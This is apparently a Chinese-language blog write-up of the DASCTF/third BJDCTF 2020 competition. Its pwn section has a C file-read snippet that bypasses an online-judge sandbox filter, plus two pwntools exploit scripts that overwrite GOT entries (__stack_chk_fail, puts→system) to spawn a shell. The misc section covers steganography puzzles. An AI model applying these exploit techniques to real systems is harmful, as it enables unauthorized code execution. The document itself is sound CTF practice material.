---
title: DASCTF&第三届BJDCTF write up
date: 2020-05-24 22:21:16
tags: CTF
---
不愧是BJD，不愧是TaQini，我不配  <!--more-->
![](1.jpg)
# Pwn  
## TaQini OJ 0  
是个C语言编译器，没有复现环境我就直接写一下了  
首先提示需要打印出"Helloc TaQini"字符串，然后我就用printf打印出来了，然后他回显一个当前目录的tree，并且告诉了绝对路径  
然后尝试system("/bin/sh"),execve("/bin/sh",0,0)发现都被过滤了  
遂尝试orw，发现不能出现flag字符串，不然直接退出  
那就有点蛋疼了  
那我们不在输入C语言的时候用flag字符串，制造一个用户输入，在用户输入的时候输入flag路径  
就可以orw了  
exp  
```C++  
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
int main()
{
char a[32]={0};
char b[60]={0};

gets(a);
int fd=open(a,O_RDONLY);

read(fd,b,0x30);
write(1,b,0x30);

return 0;
}@
```  
随性而写，缩进？不存在的  
还有一个非预期是这样，两个OJ题都可以秒了  
![](feiyuqi.png)
艹？？？  
我？？？  
![](sbch.jpg)
## Memory Monster I  
分析一下，  
main里有个任意地址写  
开了canary  
![](2.png)
还有后门  
![](3.png)
直接把__stack_chk_fail@got改成后门函数就gg了  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.update(arch='amd64',os='linux',timeout=1) 
context.terminal = ['terminator','-x','sh','-c']
binary = './baby_tcache' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=elf.libc
def exp():
    p.recvuntil("addr:")
    p.send(p64(0x404028) + "\x00"*0x28)
    p.recvuntil("data:")
    p.send(p64(0x40124A))
    p.interactive()
exp()
```  
## Memory Monster II  
这题所有符号都没了，我吐了  
自己找main呗  
找了半天  
然后把里面的东西重命名了  
基本上和I是一样的  
![](4.png)
但是很难找got表了  
我找到got区，一个个试  
![](5.png)
然后发现__stack_chk_fail@got是0x4bb058，我们把这个改成main，（这里要注意，这个main要跳过setvbuf，不然程序会挂掉）就可以无限循环任意地址写了  
然后把puts的参数改成/bin/sh  
然后把puts@got改成system  
然后就gg  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './Memory_Monster_II' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def exp():
    p.recvuntil("addr:")
    payload = p64(0x4bb058) + "\x00"*0x29
    p.send(payload)
    p.recvuntil("data:")
    p.send(p64(0x401c1d))
    p.recvuntil("addr:")
    payload = p64(0x4BB100) + "\x00"*0x29
    p.send(payload)
    p.recvuntil("data:")
    p.send("/bin/sh\x00")
    p.recvuntil("addr:")
    payload = p64(0x4bb0c0) + "\x00"*0x29
    p.send(payload)
    p.recvuntil("data:")
    p.send(p64(0x401d00))
    
    p.interactive()
exp()
```  
# Misc  
后边的pwn都不会了，被迫做misc  
问卷就简单说一下  
查看页面源代码，里面有所有问题的答案，直接填上，就可以出flag  
## /bin/cat 2  
开局一张图  
![](cat.gif)
下载下来，用stegsolve变变色  
然后长这样  
![](6.png)
然后拉伸缩放一下，扫码，出来个这个  
```  
m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~
```  
md5加密一下就是flag  
## babyweb  
开局一个抖肩舞webp  
没什么用，我还以为里面有隐写  
有一个压缩包，下载下来发现要密码  
然后F12看一下，里面有个零宽字符隐写  
![](7.png)
怎么解密呢？  
google一下  
![](8.png)
然后就得到了压缩包的密码  
然后打开长这样    
![](9.png)
？？？？  
winhex打开，发现png文件头在末尾了  
![](10.png)
用python倒序一下  
```python  
f = open("f14g.png", "rb")
s = f.read()
f.close()
f = open("2.png", "wb")
f.write(s[::-1])
f.close()
```  
出来这么个玩意儿  
![](flag.png)
我？？？  
然后google识图，发现是四种字符  
alphabet minimoys  
标准银河字母  
跳舞小人  
宝可梦  
这里特别提醒！众所周知，百度是个垃圾玩意儿，识图识了个寂寞，啥也没有  
然后去找到里面对对应的字符，结合hint，把Q改成W  
然后md5加密一波  
gg  
</br>
这第三届BJDCTF的质量真的很高，有一说一，每一届的质量都很不错，但实在是我自己太菜了，做不出什么题  
最后一定要膜拜一波大师傅  
我愈发感觉自己不配打CTF了  
![](dashifu.png)